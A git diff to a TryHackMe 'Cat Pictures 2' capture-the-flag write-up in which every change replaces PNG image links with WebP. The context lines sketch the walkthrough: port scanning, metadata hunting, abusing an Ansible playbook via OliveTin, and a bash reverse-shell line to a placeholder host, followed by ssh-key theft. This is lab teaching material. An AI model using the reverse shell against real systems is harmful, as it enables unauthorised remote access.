@@ -4,7 +4,7 @@ A writeup for the room [Cat Pictures 2](https://tryhackme.com/room/catpictures2)
 
 > Now with more Cat Pictures!
 
-<Image src={require("./logo.png").default} height="256" />
+<Image src={require("./logo.webp").default} height="256" />
 
 Main parts of the room:
 
@@ -23,7 +23,7 @@ We find five open ports with three web servers publicly accessible.
 nmap -sS <HOST>
 ```
 
-<Image src={require("./nmap.png").default} />
+<Image src={require("./nmap.webp").default} />
 
 ```
 22 -> SSH
@@ -41,7 +41,7 @@ We can begin by looking inside the Lychee Photo Album.
 
 In the info of the first image we can find a message about stripping away the metadata.
 
-<Image src={require("./image.png").default} />
+<Image src={require("./image.webp").default} />
 
 Once the image is downloaded, we can check its metadata to find an url to a secret txt note.
 
@@ -49,7 +49,7 @@ Once the image is downloaded, we can check its metadata to find an url to a secr
 exiftool image.jpg
 ```
 
-<Image src={require("./metadata.png").default} />
+<Image src={require("./metadata.webp").default} />
 
 ### The secret note
 
@@ -74,7 +74,7 @@ Now, we have the credentials for the Gitea instance.
 
 Once logged in, we can see a repository called `ansible`.
 
-<Image src={require("./repo.png").default} />
+<Image src={require("./repo.webp").default} />
 
 Inside the repository there is a file called `flag1.txt`. Open it to get the first flag.
 
@@ -86,7 +86,7 @@ From the secret note, we know that Ansible is accessible on the port 1337.
 
 There we can find a OliveTin instance that allows to run the Ansible tasks.
 
-<Image src={require("./ansible.png").default} />
+<Image src={require("./ansible.webp").default} />
 
 ### Editing the playbook
 
@@ -94,7 +94,7 @@ It is possible to change the script `playbook.yml` through Gitea and then run it
 
 If you prefer you can also configure the ssh access and modify it from your machine.
 
-<Image src={require("./edit.png").default} />
+<Image src={require("./edit.webp").default} />
 
 Firstly, we can print the content of the home folder.
 
@@ -136,7 +136,7 @@ We can edit again the script to print the content of the flag.
     - debug: var=flag2
 ```
 
-<Image src={require("./ansible-output.png").default} />
+<Image src={require("./ansible-output.webp").default} />
 
 If you check the output, you can see the second flag.
 
@@ -172,7 +172,7 @@ In this Gist you can find an example:
       shell: bash -c 'bash -i >& /dev/tcp/<HOST>/<PORT> 0>&1'
 ```
 
-<Image src={require("./rev.png").default} />
+<Image src={require("./rev.webp").default} />
 
 ### Stealing ssh keys
 
@@ -207,4 +207,4 @@ make
 
 The third flag is in the root folder.
 
-<Image src={require("./pe.png").default} />
+<Image src={require("./pe.webp").default} />
